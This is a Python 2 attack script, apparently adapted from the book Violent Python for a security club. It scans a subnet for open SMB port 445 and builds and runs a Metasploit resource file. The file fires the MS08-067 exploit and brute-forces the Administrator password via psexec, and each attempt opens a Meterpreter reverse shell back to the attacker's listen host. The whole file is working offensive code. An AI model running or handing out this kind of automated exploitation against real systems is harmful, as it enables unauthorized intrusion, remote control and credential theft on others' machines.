#!/usr/bin/env python
# -*- coding: utf-8 -*-

# An Evil python2 script to exploit poor ole' Windows XP SP2
# Inspired and largely ripped from chapter 2 of Violent Python by TJ O'Connor. Credit goes to him.
# https://github.com/CDC-UI/cdc-ui
# Requires: Metasploit, nmap, python-nmap
# This is best run on Kali Linux. You will go insane trying to do this on (Windows|Mac|HP-UX)

# Author:           Christopher Goes
# Date:             8-25-2016
# Migration date:   3-13-2017

"""An Evil Python 2 script to exploit poor ole' Windows XP SP2. 
Inspired and largely ripped from chapter 2 of Violent Python by TJ O'Connor. Credit goes to him.
Requires: Metasploit, nmap, python-nmap
This is best run on Kali Linux. You will go insane trying to do this on (Windows|Mac|HP-UX)

    Usage:
        evil.py -t <HOSTS> -l <HOST> [options]

    Options:
        -h, --help      Show this screen
        -t <HOSTS>      Specify the target address[es]
        -l <HOST>       Specify the listen address
        -p <PORT>       Specify the listen port [default: 1337]
        -f <FILE>       Password file for SMB brute force attempt

"""

import os
import nmap
import docopt


def find_tgts(subnet):
    nm_scan = nmap.PortScanner()
    nm_scan.scan(subnet, '445')
    tgt_hosts = []
    for host in nm_scan.all_hosts():
        if nm_scan[host].has_tcp(445):
            state = nm_scan[host]['tcp'][445]['state']
            if state == 'open':
                print '[+] Found Target Host: ' + host
                tgt_hosts.append(host)
    return tgt_hosts


def setup_handler(config_file, lhost, lport):
    config_file.write('use exploit/multi/handler\n')
    config_file.write('set payload ' + 'windows/meterpreter/reverse_tcp\n')
    config_file.write('set LPORT ' + str(lport) + '\n')
    config_file.write('set LHOST ' + lhost + '\n')
    config_file.write('exploit -j -z\n')
    config_file.write('setg DisablePayloadHandler 1\n')


def conficker_exploit(config_file, tgt_host, lhost, lport):
    config_file.write('use exploit/windows/smb/ms08_067_netapi\n')
    config_file.write('set RHOST ' + str(tgt_host) + '\n')
    config_file.write('set payload ' + 'windows/meterpreter/reverse_tcp\n')
    config_file.write('set LPORT ' + str(lport) + '\n')
    config_file.write('set LHOST ' + lhost + '\n')
    config_file.write('exploit -j -z\n')


def smb_brute(config_file, tgt_host, passwd_file, lhost, lport):
    username = 'Administrator'
    pF = open(passwd_file, 'r')
    for password in pF.readlines():
        password = password.strip('\n').strip('\r')
        config_file.write('use exploit/windows/smb/psexec\n')
        config_file.write('set SMBUser ' + str(username) + '\n')
        config_file.write('set SMBPass ' + str(password) + '\n')
        config_file.write('set RHOST ' + str(tgt_host) + '\n')
        config_file.write('set payload ' + 'windows/meterpreter/reverse_tcp\n')
        config_file.write('set LPORT ' + str(lport) + '\n')
        config_file.write('set LHOST ' + lhost + '\n')
        config_file.write('exploit -j -z\n')


def main():
    config_file = open('meta.rc', 'w')
    arguments = docopt.docopt(__doc__)
    lhost = arguments['-l']
    lport = arguments['-p']
    passwd_file = arguments['-f']
    tgt_hosts = find_tgts(arguments['-t'])
    setup_handler(config_file, lhost, lport)

    for tgt_host in tgt_hosts:
        conficker_exploit(config_file, tgt_host, lhost, lport)
        if passwd_file:
            smb_brute(config_file, tgt_host, passwd_file, lhost, lport)

    config_file.close()
    os.system('msfconsole -r meta.rc')


if __name__ == '__main__':
    main()
